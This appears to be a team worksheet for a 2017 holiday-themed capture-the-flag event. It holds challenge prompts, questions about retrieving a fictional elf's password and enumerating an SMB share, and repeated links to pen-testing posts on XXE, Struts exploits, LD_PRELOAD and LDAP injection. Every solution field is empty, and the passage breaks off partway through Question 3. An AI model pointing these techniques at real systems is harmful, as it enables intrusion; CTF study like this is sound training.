<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="orgd374ff8"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org664c27c"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="org576e1bf"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found.
</p>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="orgb45fa96"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org5710694"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org6e1d856"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>

<li><a id="loot"></a><a id="org4356d81"></a>Loot<br />
<div class="outline-text-5" id="text-loot">
<p>
Anything interesting hidden on the system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org401e86b" class="outline-3">
<h3 id="org401e86b">We're Off To See The</h3>
<div class="outline-text-3" id="text-org401e86b">
</div>
<div id="outline-container-org6b7a9d7" class="outline-4">
<h4 id="answer-template"><a id="org6b7a9d7"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org60a6090"></a>Question<br />
<div class="outline-text-5" id="text-question">
<pre class="example">

                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _(_      _Y_      _Y_      _Y_      _Y_      _)_
              [___]    [___]    [___]    [___]    [___]    [___]
              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
         jgs  \::./    \::./    \::./    \::./    \::./    \::./
               '='      '='      '='      '='      '='      '='


Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal"></a><a id="org871d812"></a>How to find the terminal<br />
<div class="outline-text-5" id="text-how-to-find-the-terminal">
<p>
Where was the terminal? What's the direct link to it?
</p>
</div>
</li>

<li><a id="background-information"></a><a id="org9471c64"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this terminal already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="org7c2f431"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org30f6662"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="org5f9ed91"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found.
</p>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org3a3240e"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org5762599"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="orgc107591"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>

<li><a id="loot"></a><a id="org3439f61"></a>Loot<br />
<div class="outline-text-5" id="text-loot">
<p>
Anything interesting hidden on the system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org704bdc4" class="outline-3">
<h3 id="org704bdc4">Winconceivable The Cliffs Of Insanity</h3>
<div class="outline-text-3" id="text-org704bdc4">
</div>
<div id="outline-container-org7806f1e" class="outline-4">
<h4 id="answer-template"><a id="org7806f1e"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org851f9c4"></a>Question<br />
<div class="outline-text-5" id="text-question">
<pre class="example">
                ___,@
               /  &lt;
          ,_  /    \  _,
      ?    \`/______\`/
   ,_(_).  |; (e  e) ;|
    \___ \ \/\   7  /\/    _\8/_
        \/\   \'=='/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'
            /   ()   \
           '-.______.-'
   jgs   _    |_||_|    _
        (@____) || (____@)
         \______||______/


My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.


Kill the "santaslittlehelperd" process to complete this challenge.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal"></a><a id="orga7ce98d"></a>How to find the terminal<br />
<div class="outline-text-5" id="text-how-to-find-the-terminal">
<p>
Where was the terminal? What's the direct link to it?
</p>
</div>
</li>

<li><a id="background-information"></a><a id="orga013ae4"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this terminal already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="org20cb086"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="orga5c2375"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="org8a8f56f"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found.
</p>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org0817230"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org16d63c4"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org62323bd"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>

<li><a id="loot"></a><a id="org3b1f88c"></a>Loot<br />
<div class="outline-text-5" id="text-loot">
<p>
Anything interesting hidden on the system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org2f7febe" class="outline-3">
<h3 id="org2f7febe">Winter Wonder Landing</h3>
<div class="outline-text-3" id="text-org2f7febe">
</div>
<div id="outline-container-orgb9c8072" class="outline-4">
<h4 id="answer-template"><a id="orgb9c8072"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org93b310e"></a>Question<br />
<div class="outline-text-5" id="text-question">
<pre class="example">
                                 |
                               \ ' /
                             -- (*) --
                                &gt;*&lt;
                               &gt;0&lt;@&lt;
                              &gt;&gt;&gt;@&lt;&lt;*
                             &gt;@&gt;*&lt;0&lt;&lt;&lt;
                            &gt;*&gt;&gt;@&lt;&lt;&lt;@&lt;&lt;
                           &gt;@&gt;&gt;0&lt;&lt;&lt;*&lt;&lt;@&lt;
                          &gt;*&gt;&gt;0&lt;&lt;@&lt;&lt;&lt;@&lt;&lt;&lt;
                         &gt;@&gt;&gt;*&lt;&lt;@&lt;&gt;*&lt;&lt;0&lt;*&lt;
           \*/          &gt;0&gt;&gt;*&lt;&lt;@&lt;&gt;0&gt;&lt;&lt;*&lt;@&lt;&lt;
       ___\\U//___     &gt;*&gt;&gt;@&gt;&lt;0&lt;&lt;*&gt;&gt;@&gt;&lt;*&lt;0&lt;&lt;
       |\\ | | \\|    &gt;@&gt;&gt;0&lt;*&lt;0&gt;&gt;@&lt;&lt;0&lt;&lt;&lt;*&lt;@&lt;&lt;  
       | \\| | _(UU)_ &gt;((*))_&gt;0&gt;&lt;*&lt;0&gt;&lt;@&lt;&lt;&lt;0&lt;*&lt;
       |\ \| || / //||.*.*.*.|&gt;&gt;@&lt;&lt;*&lt;&lt;@&gt;&gt;&lt;0&lt;&lt;&lt;
       |\\_|_|&amp;&amp;_// ||*.*.*.*|_\\db//_               
       """"|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|&gt;&gt;&gt;&gt;&gt;&gt;|
           ~~~~~~~~         '""""`------'

My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?


Find and run the elftalkd binary to complete this challenge.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal"></a><a id="org0ac9eaa"></a>How to find the terminal<br />
<div class="outline-text-5" id="text-how-to-find-the-terminal">
<p>
Where was the terminal? What's the direct link to it?
</p>
</div>
</li>

<li><a id="background-information"></a><a id="org7fed709"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this terminal already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="org10749a6"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org79634e4"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="orgd9ce2f1"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found.
</p>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org2c99c9f"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org98fc64d"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org02468b9"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>

<li><a id="loot"></a><a id="org69253b7"></a>Loot<br />
<div class="outline-text-5" id="text-loot">
<p>
Anything interesting hidden on the system?
</p>
</div>
</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org9ea9753" class="outline-2">
<h2 id="org9ea9753">Answers</h2>
<div class="outline-text-2" id="text-org9ea9753">
</div>
<div id="outline-container-orgf47e261" class="outline-3">
<h3 id="orgf47e261">Question 1</h3>
<div class="outline-text-3" id="text-orgf47e261">
</div>
<div id="outline-container-org2aa7cab" class="outline-4">
<h4 id="answer-template"><a id="org2aa7cab"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org219a5bd"></a>Question<br />
<div class="outline-text-5" id="text-question">
<ol class="org-ol">
<li>Visit the North Pole and Beyond at the Winter Wonder Landing Level to
collect the first page of The Great Book using a giant snowball. What
is the title of that page?</li>
</ol>
</div>
</li>

<li><a id="background-information"></a><a id="orgccae63d"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="org985e076"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="orgecc9455"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="org48952f7"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org7daa5b7"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org6d82c8d"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org85a7c61"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org5ab4121" class="outline-3">
<h3 id="org5ab4121">Question 2</h3>
<div class="outline-text-3" id="text-org5ab4121">
</div>
<div id="outline-container-orgb98abd5" class="outline-4">
<h4 id="answer-template"><a id="orgb98abd5"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="orgc83f280"></a>Question<br />
<div class="outline-text-5" id="text-question">
<ol class="org-ol">
<li>Investigate the Letters to Santa application at
<a href="https://l2s.northpolechristmastown.com/">https://l2s.northpolechristmastown.com/</a>. What is the topic of The
Great Book page available in the web root of the server? What is
Alabaster Snowball's password?</li>
</ol>
</div>
</li>

<li><a id="background-information"></a><a id="org5121e54"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="org2052542"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org759b761"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="org63e1302"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org732c907"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org3f7f56a"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="orgb731891"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org43ed5d1" class="outline-3">
<h3 id="org43ed5d1">Question 3</h3>
<div class="outline-text-3" id="text-org43ed5d1">
</div>
<div id="outline-container-orgc703554" class="outline-4">
<h4 id="answer-template"><a id="orgc703554"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org2d49c6e"></a>Question<br />
<div class="outline-text-5" id="text-question">
<ol class="org-ol">
<li>The North Pole engineering team uses a Windows SMB server for sharing
documentation and correspondence. Using your access to the Letters to
Santa server, identify and enumerate the SMB file-sharing server.
What is the file server share name?</li>
</ol>
</div>
</li>

<li><a id="background-information"></a><a id="org4a80f83"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
